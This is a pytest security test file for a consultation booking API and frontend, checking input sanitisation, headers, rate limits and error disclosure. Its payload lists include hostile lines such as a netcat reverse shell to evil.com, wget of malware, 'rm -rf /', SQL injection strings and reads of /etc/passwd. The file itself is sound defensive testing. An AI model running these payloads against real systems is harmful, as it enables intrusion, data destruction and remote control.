"""
Security Validation Tests for Public Booking System

Tests security aspects of the booking frontend and API:
- Input sanitization and validation
- XSS (Cross-Site Scripting) prevention  
- SQL injection protection
- HTTPS enforcement
- Authentication and authorization
- Data privacy and GDPR compliance
- Rate limiting and DDoS protection
- CSRF protection
- Content Security Policy

Tests both frontend and backend security measures.
"""

import pytest
import asyncio
import httpx
from datetime import datetime, timedelta
import json
import ssl
import socket
from urllib.parse import urljoin
import re
import time
from typing import List, Dict, Any

# Security test configuration
BASE_URL = "http://localhost:8037"
FRONTEND_URL = "http://localhost:8041"
BOOKING_URL = f"{FRONTEND_URL}/de/kontakt/terminbuchung"
API_BASE = f"{BASE_URL}/api/v1/consultations"

# Security payloads for testing
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src='x' onerror='alert(1)'>",
    "<svg onload='alert(1)'>",
    "'>><script>alert(1)</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload='alert(1)'>",
    "javascript:void(0)",
    "vbscript:msgbox('XSS')",
    "<script>document.location='http://evil.com'</script>"
]

SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE consultants; --",
    "' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "' OR 1=1#",
    "'; INSERT INTO users VALUES('hacker','password'); --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "1' ORDER BY 1--",
    "' HAVING 1=1 --",
    "'; EXEC xp_cmdshell('dir'); --"
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| whoami",
    "&& cat /etc/passwd",
    "; rm -rf /",
    "$(id)",
    "`whoami`",
    "; curl http://evil.com",
    "| nc -e /bin/sh evil.com 1234",
    "; wget http://evil.com/malware",
    "&& python -c 'import os; os.system(\"id\")'"
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "/var/log/apache/access.log",
    "../../../../proc/version",
    "..\\..\\..\\boot.ini",
    "....\\....\\....\\windows\\win.ini"
]

@pytest.fixture
async def http_client():
    """HTTP client for security testing"""
    async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as client:
        yield client

@pytest.fixture
async def consultant_data(http_client):
    """Get consultant data for testing"""
    response = await http_client.get(f"{API_BASE}/public/consultants/active")
    if response.status_code == 200:
        data = response.json()
        return data["data"]["consultants"][0] if data["data"]["consultants"] else None
    return None

class TestInputSanitization:
    """Test input sanitization and validation"""
    
    @pytest.mark.asyncio
    async def test_xss_prevention_contact_form(self, http_client, consultant_data):
        """
        PSEUDO-CODE: XSS prevention test
        GIVEN: Booking form accepts user input
        WHEN: Malicious XSS payloads are submitted
        THEN:
            - Script tags should be sanitized or escaped
            - No JavaScript should execute
            - Content should be safely rendered
            - API should return sanitized data
        """
        
        if not consultant_data:
            pytest.skip("No consultant data available")
            
        for payload in XSS_PAYLOADS[:5]:  # Test first 5 payloads
            booking_data = {
                "consultant_id": consultant_data["id"],
                "consultation_date": (datetime.now() + timedelta(days=7)).isoformat(),
                "time_slot": "10:00",
                "contact_info": {
                    "first_name": payload,
                    "last_name": f"Test{payload[:10]}",
                    "email": "security.test@example.com",
                    "phone": "+49 123 456 7890",
                    "company": payload,
                    "website": "https://example.com"
                },
                "terms_accepted": True
            }
            
            response = await http_client.post(
                f"{API_BASE}/public/bookings",
                json=booking_data
            )
            
            if response.status_code == 200:
                response_text = response.text
                
                # Response should not contain unescaped script tags
                assert "<script>" not in response_text
                assert "javascript:" not in response_text
                assert "onerror=" not in response_text
                assert "onload=" not in response_text
                assert "alert(" not in response_text
                
                # Check if data was properly sanitized
                data = response.json()
                if "data" in data and "booking" in data["data"]:
                    booking = data["data"]["booking"]
                    
                    # Sanitized data should not contain script tags
                    assert "<script>" not in str(booking.get("first_name", ""))
                    assert "<script>" not in str(booking.get("company", ""))
            
            elif response.status_code == 422:
                # Validation error is acceptable for malicious input
                continue
            else:
                # Other errors might indicate a security issue
                print(f"Unexpected response for XSS payload: {response.status_code}")
                
    @pytest.mark.asyncio
    async def test_sql_injection_prevention(self, http_client):
        """
        PSEUDO-CODE: SQL injection prevention test
        GIVEN: API endpoints that query database
        WHEN: SQL injection payloads are sent
        THEN:
            - Database queries should be parameterized
            - No database structure should be revealed
            - No unauthorized data access should occur
            - Errors should not expose SQL details
        """
        
        # Test consultant search endpoint
        for payload in SQL_INJECTION_PAYLOADS[:5]:
            params = {
                "q": payload,
                "industry": payload,
                "status": payload
            }
            
            response = await http_client.get(
                f"{API_BASE}/public/consultants/active",
                params=params
            )
            
            response_text = response.text.lower()
            
            # Should not reveal database structure or SQL errors
            sql_error_indicators = [
                "sql syntax",
                "mysql_fetch",
                "ora-",
                "postgresql",
                "sqlite",
                "sqlstate",
                "column",
                "table",
                "database",
                "select * from",
                "union select",
                "drop table",
                "insert into"
            ]
            
            for indicator in sql_error_indicators:
                assert indicator not in response_text, f"SQL error indicator found: {indicator}"
            
            # Should return valid response structure
            if response.status_code == 200:
                data = response.json()
                assert "success" in data
                assert isinstance(data.get("data", {}), dict)
                
    @pytest.mark.asyncio
    async def test_command_injection_prevention(self, http_client, consultant_data):
        """
        PSEUDO-CODE: Command injection prevention test
        GIVEN: User input might be processed by system commands
        WHEN: Command injection payloads are submitted
        THEN:
            - No system commands should execute
            - File system access should be prevented
            - Process execution should be blocked
        """
        
        if not consultant_data:
            pytest.skip("No consultant data available")
            
        for payload in COMMAND_INJECTION_PAYLOADS[:3]:
            booking_data = {
                "consultant_id": consultant_data["id"],
                "consultation_date": (datetime.now() + timedelta(days=8)).isoformat(),
                "time_slot": "14:00",
                "contact_info": {
                    "first_name": "Command",
                    "last_name": "Injection",
                    "email": f"cmd{payload[:5]}@example.com".replace(";", "").replace("|", ""),
                    "phone": "+49 987 654 3210",
                    "company": payload
                },
                "terms_accepted": True
            }
            
            response = await http_client.post(
                f"{API_BASE}/public/bookings",
                json=booking_data
            )
            
            response_text = response.text
            
            # Should not contain command execution results
            command_outputs = [
                "/bin/", "/usr/bin/", "root:", "uid=", "gid=",
                "etc/passwd", "windows", "system32", "whoami",
                "total", "drwx", "-rw-"
            ]
            
            for output in command_outputs:
                assert output not in response_text, f"Command output detected: {output}"
                
    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self, http_client):
        """
        PSEUDO-CODE: Path traversal prevention test
        GIVEN: File access functionality exists
        WHEN: Path traversal payloads are used
        THEN:
            - File system access should be restricted
            - No sensitive files should be accessible
            - Directory listing should be prevented
        """
        
        for payload in PATH_TRAVERSAL_PAYLOADS[:5]:
            # Test various endpoints that might handle file paths
            endpoints = [
                f"/api/v1/consultations/public/booking-config",
                f"/api/v1/consultations/public/consultants/active"
            ]
            
            for endpoint in endpoints:
                # Try path traversal in query parameters
                params = {
                    "file": payload,
                    "path": payload,
                    "config": payload
                }
                
                response = await http_client.get(f"{BASE_URL}{endpoint}", params=params)
                
                response_text = response.text.lower()
                
                # Should not contain sensitive file contents
                sensitive_content = [
                    "root:x:0:0",
                    "[boot loader]",
                    "windows registry",
                    "/etc/passwd",
                    "# /etc/hosts",
                    "localhost",
                    "version info"
                ]
                
                for content in sensitive_content:
                    assert content not in response_text, f"Sensitive file content detected: {content}"

class TestHTTPSAndTransportSecurity:
    """Test HTTPS enforcement and transport security"""
    
    @pytest.mark.asyncio
    async def test_https_enforcement(self, http_client):
        """
        PSEUDO-CODE: HTTPS enforcement test
        GIVEN: Security-sensitive operations (payment, personal data)
        WHEN: HTTP requests are made to secure endpoints
        THEN:
            - HTTPS should be enforced for secure operations
            - HTTP requests should redirect to HTTPS
            - Secure headers should be present
        """
        
        # Note: In development, HTTPS might not be enforced
        # This test checks if HTTPS would be enforced in production
        
        secure_endpoints = [
            "/api/v1/consultations/public/bookings",
            "/api/v1/consultations/public/bookings/test/payment"
        ]
        
        for endpoint in secure_endpoints:
            response = await http_client.get(f"{BASE_URL}{endpoint}")
            
            # Check security headers (should be present in production)
            headers = response.headers
            
            # Document what security headers should be present
            expected_security_headers = [
                "strict-transport-security",
                "x-content-type-options", 
                "x-frame-options",
                "x-xss-protection",
                "content-security-policy"
            ]
            
            present_headers = []
            for header in expected_security_headers:
                if header in headers:
                    present_headers.append(header)
                    
            # In development, some headers might be missing
            print(f"Security headers present: {present_headers}")
            
    @pytest.mark.asyncio
    async def test_ssl_configuration(self):
        """
        PSEUDO-CODE: SSL configuration test
        GIVEN: HTTPS endpoints (in production)
        WHEN: SSL connection is established
        THEN:
            - Strong SSL/TLS version should be used
            - Strong cipher suites should be supported
            - Certificate should be valid
        """
        
        # This test would be more relevant in production with HTTPS
        # For development, we document the requirements
        
        ssl_requirements = {
            "min_tls_version": "TLSv1.2",
            "cipher_suites": [
                "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
                "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
            ],
            "certificate_validation": True,
            "hsts_enabled": True
        }
        
        print(f"SSL requirements for production: {json.dumps(ssl_requirements, indent=2)}")
        assert ssl_requirements["min_tls_version"] == "TLSv1.2"

class TestAuthenticationAndAuthorization:
    """Test authentication and authorization mechanisms"""
    
    @pytest.mark.asyncio
    async def test_unauthorized_access_prevention(self, http_client):
        """
        PSEUDO-CODE: Unauthorized access test
        GIVEN: API endpoints that should require authorization
        WHEN: Requests are made without proper credentials
        THEN:
            - Admin endpoints should require authentication
            - Sensitive data should not be accessible
            - Proper error messages should be returned
        """
        
        # Test admin endpoints without authorization
        admin_endpoints = [
            "/api/v1/consultations/admin/bookings",
            "/api/v1/consultations/admin/bookings/statistics",
            "/api/v1/consultants/admin/consultants"
        ]
        
        for endpoint in admin_endpoints:
            response = await http_client.get(f"{BASE_URL}{endpoint}")
            
            # Should require authentication
            assert response.status_code in [401, 403, 404], f"Admin endpoint {endpoint} should require auth"
            
    @pytest.mark.asyncio
    async def test_session_security(self, http_client):
        """
        PSEUDO-CODE: Session security test
        GIVEN: User sessions exist
        WHEN: Session handling is tested
        THEN:
            - Sessions should have secure flags
            - Session IDs should be random and unique
            - Session fixation should be prevented
        """
        
        # Test session cookie security (if sessions are used)
        response = await http_client.get(f"{BASE_URL}/api/v1/consultations/public/booking-config")
        
        cookies = response.cookies
        
        for cookie in cookies:
            # Session cookies should have security flags
            if "session" in cookie.name.lower() or "token" in cookie.name.lower():
                # In production, these should be secure
                print(f"Cookie {cookie.name}: secure={cookie.secure}, httponly={cookie.httponly}")

class TestRateLimitingAndDDoSProtection:
    """Test rate limiting and DDoS protection"""
    
    @pytest.mark.asyncio  
    async def test_rate_limiting(self, http_client):
        """
        PSEUDO-CODE: Rate limiting test
        GIVEN: API endpoints that should be rate limited
        WHEN: Rapid requests are made
        THEN:
            - Rate limiting should be applied
            - Appropriate HTTP status codes should be returned
            - Service should remain available for legitimate users
        """
        
        # Test rapid requests to booking endpoint
        consultant_response = await http_client.get(f"{API_BASE}/public/consultants/active")
        if consultant_response.status_code != 200:
            pytest.skip("Cannot get consultant data for rate limiting test")
            
        consultant_id = consultant_response.json()["data"]["consultants"][0]["id"]
        
        # Make rapid requests
        responses = []
        for i in range(20):  # 20 rapid requests
            booking_data = {
                "consultant_id": consultant_id,
                "consultation_date": (datetime.now() + timedelta(days=10 + i)).isoformat(),
                "time_slot": "10:00",
                "contact_info": {
                    "first_name": f"Rate{i}",
                    "last_name": "Limit",
                    "email": f"rate.limit.{i}@example.com",
                    "phone": "+49 123 456 7890"
                },
                "terms_accepted": True
            }
            
            response = await http_client.post(
                f"{API_BASE}/public/bookings",
                json=booking_data
            )
            
            responses.append(response.status_code)
            
            # Small delay to avoid overwhelming the service
            await asyncio.sleep(0.1)
        
        # Analyze responses
        success_count = sum(1 for status in responses if status in [200, 201])
        rate_limited_count = sum(1 for status in responses if status == 429)
        error_count = sum(1 for status in responses if status >= 500)
        
        print(f"Rate limiting test - Success: {success_count}, Rate limited: {rate_limited_count}, Errors: {error_count}")
        
        # Service should remain stable (no 5xx errors)
        assert error_count < 5, "Too many server errors during rate limiting test"
        
    @pytest.mark.asyncio
    async def test_request_size_limits(self, http_client):
        """
        PSEUDO-CODE: Request size limit test
        GIVEN: API accepts request payloads
        WHEN: Extremely large payloads are sent
        THEN:
            - Request size should be limited
            - Large payloads should be rejected
            - Server should not crash or consume excessive memory
        """
        
        # Create oversized payload
        large_string = "A" * 1000000  # 1MB string
        
        oversized_data = {
            "consultant_id": "test-id",
            "consultation_date": datetime.now().isoformat(),
            "time_slot": "10:00",
            "contact_info": {
                "first_name": large_string,
                "last_name": large_string,
                "email": "test@example.com",
                "phone": "+49 123 456 7890",
                "company": large_string
            },
            "terms_accepted": True
        }
        
        response = await http_client.post(
            f"{API_BASE}/public/bookings",
            json=oversized_data
        )
        
        # Should reject oversized requests
        assert response.status_code in [400, 413, 422], "Oversized request should be rejected"

class TestDataPrivacyAndGDPR:
    """Test data privacy and GDPR compliance"""
    
    @pytest.mark.asyncio
    async def test_personal_data_handling(self, http_client, consultant_data):
        """
        PSEUDO-CODE: Personal data handling test
        GIVEN: Personal data is collected
        WHEN: Data is processed and stored
        THEN:
            - Only necessary data should be collected
            - Data should be properly secured
            - Users should have control over their data
            - GDPR compliance should be maintained
        """
        
        if not consultant_data:
            pytest.skip("No consultant data available")
            
        # Create booking with personal data
        booking_data = {
            "consultant_id": consultant_data["id"],
            "consultation_date": (datetime.now() + timedelta(days=15)).isoformat(),
            "time_slot": "10:00",
            "contact_info": {
                "first_name": "Privacy",
                "last_name": "Test",
                "email": "privacy.test@example.com",
                "phone": "+49 555 123 4567"
            },
            "terms_accepted": True
        }
        
        response = await http_client.post(
            f"{API_BASE}/public/bookings",
            json=booking_data
        )
        
        if response.status_code == 200:
            data = response.json()
            booking_id = data["data"]["booking_id"]
            
            # Retrieve booking data
            booking_response = await http_client.get(
                f"{API_BASE}/public/bookings/{booking_id}"
            )
            
            if booking_response.status_code == 200:
                booking_data = booking_response.json()["data"]["booking"]
                
                # Verify that sensitive data is not exposed unnecessarily
                sensitive_fields = ["password", "ssn", "tax_id", "credit_card"]
                
                booking_str = json.dumps(booking_data).lower()
                for field in sensitive_fields:
                    assert field not in booking_str, f"Sensitive field {field} found in response"
                    
    @pytest.mark.asyncio
    async def test_data_retention_policies(self, http_client):
        """
        PSEUDO-CODE: Data retention test
        GIVEN: Personal data is collected
        WHEN: Data retention period expires
        THEN:
            - Old data should be purged according to policy
            - Data anonymization should occur when required
            - Audit logs should track data lifecycle
        """
        
        # This test documents the data retention requirements
        retention_policy = {
            "booking_data": "2 years after consultation",
            "payment_data": "7 years (legal requirement)",
            "marketing_data": "Until consent withdrawn",
            "audit_logs": "3 years",
            "anonymization_after": "Data retention period expires"
        }
        
        print(f"Data retention policy: {json.dumps(retention_policy, indent=2)}")
        
        # In a real test, we would check for automated data purging
        assert retention_policy["booking_data"] == "2 years after consultation"

class TestContentSecurityPolicy:
    """Test Content Security Policy and XSS prevention"""
    
    @pytest.mark.asyncio
    async def test_csp_headers(self, http_client):
        """
        PSEUDO-CODE: CSP headers test
        GIVEN: Web application serves content
        WHEN: Pages are loaded
        THEN:
            - Content-Security-Policy headers should be present
            - XSS attacks should be mitigated
            - Resource loading should be restricted
        """
        
        # Test frontend CSP headers
        try:
            response = await http_client.get(BOOKING_URL)
            
            headers = response.headers
            csp_header = headers.get("content-security-policy", "")
            
            if csp_header:
                print(f"CSP Header present: {csp_header}")
                
                # CSP should restrict script sources
                assert "script-src" in csp_header.lower()
                
                # Should prevent inline scripts in production
                if "'unsafe-inline'" in csp_header:
                    print("Warning: unsafe-inline found in CSP")
                    
            else:
                print("Warning: No CSP header found (should be present in production)")
                
        except Exception as e:
            print(f"Could not test CSP headers: {e}")

class TestAPISecurityMiscellaneous:
    """Miscellaneous API security tests"""
    
    @pytest.mark.asyncio
    async def test_http_methods_security(self, http_client):
        """
        PSEUDO-CODE: HTTP methods security test
        GIVEN: API endpoints exist
        WHEN: Various HTTP methods are used
        THEN:
            - Only allowed methods should be accepted
            - Dangerous methods should be disabled
            - Proper error codes should be returned
        """
        
        test_endpoint = f"{API_BASE}/public/booking-config"
        
        # Test various HTTP methods
        methods_to_test = ["OPTIONS", "HEAD", "PUT", "DELETE", "PATCH", "TRACE"]
        
        for method in methods_to_test:
            response = await http_client.request(method, test_endpoint)
            
            # Methods should either work or return proper error codes
            if response.status_code == 200:
                print(f"{method} method allowed on {test_endpoint}")
            elif response.status_code in [405, 501]:
                print(f"{method} method properly rejected on {test_endpoint}")
            else:
                print(f"{method} method returned {response.status_code} on {test_endpoint}")
            
            # TRACE method should be disabled for security
            if method == "TRACE":
                assert response.status_code != 200, "TRACE method should be disabled"
                
    @pytest.mark.asyncio
    async def test_error_information_disclosure(self, http_client):
        """
        PSEUDO-CODE: Error information disclosure test
        GIVEN: API encounters errors
        WHEN: Error responses are returned
        THEN:
            - Error messages should not reveal system information
            - Stack traces should not be exposed
            - Database schema should not be revealed
        """
        
        # Trigger various errors and check responses
        error_scenarios = [
            {"url": f"{API_BASE}/public/consultants/nonexistent", "method": "GET"},
            {"url": f"{API_BASE}/public/bookings/invalid-uuid", "method": "GET"},
            {"url": f"{API_BASE}/public/bookings", "method": "POST", "data": {"invalid": "data"}}
        ]
        
        for scenario in error_scenarios:
            if scenario["method"] == "GET":
                response = await http_client.get(scenario["url"])
            elif scenario["method"] == "POST":
                response = await http_client.post(scenario["url"], json=scenario.get("data", {}))
                
            response_text = response.text.lower()
            
            # Should not contain sensitive information
            sensitive_info = [
                "traceback", "stack trace", "exception", "debug",
                "database", "mysql", "postgresql", "sqlite",
                "internal server", "django", "flask", "fastapi",
                "secret", "password", "token", "api_key",
                "/usr/", "/var/", "/etc/", "c:\\", "d:\\"
            ]
            
            for info in sensitive_info:
                if info in response_text:
                    print(f"Warning: Sensitive info '{info}' found in error response")

if __name__ == "__main__":
    """
    Run security tests:
    python -m pytest tests/security/input-validation.py -v --tb=short
    """
    pytest.main([__file__, "-v", "--tb=short", "-x"])  # Stop on first failure